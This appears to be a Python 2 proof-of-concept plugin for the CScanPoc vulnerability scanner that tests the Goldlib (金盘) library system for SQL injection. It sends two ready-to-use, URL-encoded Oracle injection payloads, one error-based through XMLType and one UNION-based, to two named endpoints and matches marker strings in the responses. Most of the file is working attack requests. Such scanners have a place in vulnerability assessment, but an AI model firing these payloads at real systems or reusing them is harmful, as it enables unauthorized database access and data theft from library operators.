# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Goldlib_0008'  # 平台漏洞编号，留空
    name = '金盘大型图书馆系统 SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-17'  # 漏洞公布时间
    desc = '''
        金盘大型图书馆系统 /opac/rss/do.jsp?marcType=1 SQL注射漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金盘图书馆系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '78325c91-3a34-435b-98af-b3835b93c1f3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-076316
            # refer:http://www.wooyun.org/bugs/wooyun-2010-085140
            hh = hackhttp.hackhttp()
            payload = '/opac/rss/do.jsp?marcType=1'
            getdata = '%20AND%206615%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286615%3D6615%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29'
            url = self.target + payload + getdata
            code, head, res, errcode, _ = hh.http(url)

            if code == 500 and 'qbzxq1qppjq' in res:
                #security_hole(arg+payload+'   :found sql Injection')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            payload = '/AdvicesRequest.aspx?DBKey=20004'
            getdata = '%20UNION%20ALL%20SELECT%20CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2869%29%7C%7CCHR%2890%29%7C%7CCHR%28118%29%7C%7CCHR%28116%29%7C%7CCHR%28119%29%7C%7CCHR%28113%29%7C%7CCHR%2884%29%7C%7CCHR%2885%29%7C%7CCHR%28102%29%7C%7CCHR%2882%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%20FROM%20DUAL--'
            url = self.target + payload + getdata
            code, head, res, errcode, _ = hh.http(url)

            if code == 200 and 'qzkpqEZvtwqTUfRqzqvq' in res:
                #security_hole(arg+payload+'   :found sql Injection')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
